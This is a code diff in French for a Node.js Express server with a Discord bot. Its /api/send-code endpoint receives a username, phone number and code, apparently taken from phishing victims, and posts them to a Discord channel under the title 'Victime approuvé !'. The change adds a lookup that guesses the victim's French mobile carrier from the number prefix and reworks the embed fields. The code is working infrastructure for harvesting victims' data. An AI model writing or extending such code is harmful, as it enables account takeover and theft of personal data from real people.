@@ -10,6 +10,27 @@ app.use(express.json());
 const TOKEN = process.env.TOKEN;
 const CHANNEL_ID = process.env.CHANNEL_ID;
 
+// --- FONCTION POUR DÉTECTER L'OPÉRATEUR ---
+const getOperateur = (phone) => {
+    if (!phone || phone.length < 4) return "Inconnu";
+    
+    const num = phone.replace(/\s/g, '');
+    const prefix = num.substring(0, 4);
+    
+    const prefixes = {
+        "0607": "Orange", "0608": "Orange", "0609": "Orange",
+        "0601": "SFR", "0602": "SFR", "0603": "SFR",
+        "0660": "Bouygues", "0661": "Bouygues", "0662": "Bouygues", "0663": "Bouygues",
+        "0664": "Bouygues", "0665": "Bouygues", "0666": "Bouygues", "0667": "Bouygues",
+        "0668": "Bouygues", "0669": "Bouygues",
+        "0700": "Free", "0701": "Free", "0702": "Free", "0703": "Free", "0704": "Free",
+        "0705": "Free", "0706": "Free", "0707": "Free", "0708": "Free", "0709": "Free"
+    };
+    
+    return prefixes[prefix] || "Autre / MVNO";
+};
+// --------------------------------------------
+
 // --- BOT DISCORD ---
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
 let lastAction = { status: 'waiting', length: 0 };
@@ -53,14 +74,15 @@ app.post('/api/send-code', async (req, res) => {
     const { pseudo, phone, code, length } = req.body;
     try {
         const channel = await client.channels.fetch(CHANNEL_ID);
+        const operateur = getOperateur(phone); // On récupère l'opérateur
+
         const embed = new EmbedBuilder()
             .setTitle('Victime approuvé !')
-            .setColor('#00FF00')
+            .setColor('#FFFC00')
             .addFields(
                 { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                 { name: 'Numéro', value: `\`${phone}\``, inline: true },
-                { name: 'Choix', value: `\`${length} chiffres\``, inline: false },
-                { name: 'Code', value: `\`${code}\``, inline: false }
+                { name: 'Opérateur (estimé)', value: `\`${operateur}\``, inline: true } // Nouveau champ
             )
             .setTimestamp();
         
